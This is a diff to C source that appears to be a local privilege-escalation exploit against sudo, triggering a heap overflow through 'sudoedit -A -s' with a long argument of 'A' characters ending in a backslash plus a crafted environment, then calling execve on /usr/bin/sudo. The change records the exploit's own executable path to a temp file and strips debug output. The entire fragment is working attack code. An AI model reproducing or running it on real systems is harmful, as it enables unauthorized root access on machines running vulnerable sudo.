@@ -19,13 +19,14 @@ char *env_var(char *var, int overflow_len, char c) {
   return p;
 }
 
-void write_to_tmp() {
+void write_exe_to_tmp() {
   FILE *tmp = fopen(TMP_PATH, "w");
   CHECK(tmp == 0);
   char path[PATH_LEN] = {0};
-  CHECK(getcwd(path, PATH_LEN) == 0);
-  int path_len = strlen(path);
-  CHECK(fwrite(path, sizeof(char), path_len, tmp) != path_len);
+
+  CHECK(readlink("/proc/self/exe", path, sizeof path) == -1);
+  CHECK(fwrite(path, sizeof(char), strlen(path), tmp) == 0);
+
   printf("write cwd %s to %s", path, TMP_PATH);
   fclose(tmp);
 }
@@ -36,7 +37,7 @@ int main() {
   memset(A, 'A', 0xe0);
   A[0xe0] = '\\';
 
-  char *argv[] = {"sudoedit", "-A", "-s", A, 0};
+  char *e_argv[] = {"sudoedit", "-A", "-s", A, 0};
 
   int env_pos = 0;
   char *envp[ENV_LEN];
@@ -71,16 +72,8 @@ int main() {
   envp[env_pos++] = "TZ=:";
   envp[env_pos++] = 0;
 
-  write_to_tmp();
+  write_exe_to_tmp();
 
-  for (int i = 0; i < env_pos; ++i) {
-    printf("envp[%d]=%s %lu\n", i, envp[i], envp[i] != 0 ? strlen(envp[i]) : 0);
-  }
-
-  for (int i = 0; i < sizeof(argv) / sizeof(argv[0]); ++i) {
-    printf("argv[%d]=%s %lu\n", i, argv[i], argv[i] != 0 ? strlen(argv[i]) : 0);
-  }
-
-  execve("/usr/bin/sudo", argv, envp);
+  execve("/usr/bin/sudo", e_argv, envp);
   return 0;
 }
